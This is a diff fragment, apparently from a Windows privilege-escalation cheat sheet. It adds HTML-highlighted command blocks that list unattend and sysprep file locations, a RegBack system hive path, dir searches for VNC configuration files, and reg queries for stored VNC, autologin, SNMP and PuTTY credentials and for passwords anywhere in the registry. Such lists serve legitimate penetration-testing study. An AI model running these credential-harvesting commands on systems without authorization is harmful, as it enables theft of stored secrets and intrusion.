+%SYSTEMROOT%<span style="color:#8045ff">\S</span>ystem32<span style="color:#8045ff">\c</span>onfig<span style="color:#8045ff">\R</span>egBack<span style="color:#8045ff">\s</span>ystem</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Into Common files</span>
+c:<span style="color:#8045ff">\s</span>ysprep.inf
+c:<span style="color:#8045ff">\s</span>ysprep<span style="color:#8045ff">\s</span>ysprep.xml
+c:<span style="color:#8045ff">\u</span>nattend.xml
+%WINDIR%<span style="color:#8045ff">\P</span>anther<span style="color:#8045ff">\U</span>nattend<span style="color:#8045ff">\U</span>nattended.xml
+%WINDIR%<span style="color:#8045ff">\P</span>anther<span style="color:#8045ff">\U</span>nattended.xml
+dir c:<span style="color:#8045ff">\*</span>vnc.ini /s /b
+dir c:<span style="color:#8045ff">\*</span>ultravnc.ini /s /b 
+dir c:<span style="color:#8045ff">\ </span>/s /b <span style="color:#111">|</span> findstr /si *vnc.ini</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># VNC</span>
+reg query <span style="color:#d88200">&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span>
+
+<span style="color:#75715e"># Windows autologin</span>
+reg query <span style="color:#d88200">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span>
+
+<span style="color:#75715e"># SNMP Paramters</span>
+reg query <span style="color:#d88200">&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span>
+
+<span style="color:#75715e"># Putty</span>
+reg query <span style="color:#d88200">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>
+
+<span style="color:#75715e"># Search for password in registry</span>
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s</code></pre></div>
 
     
     
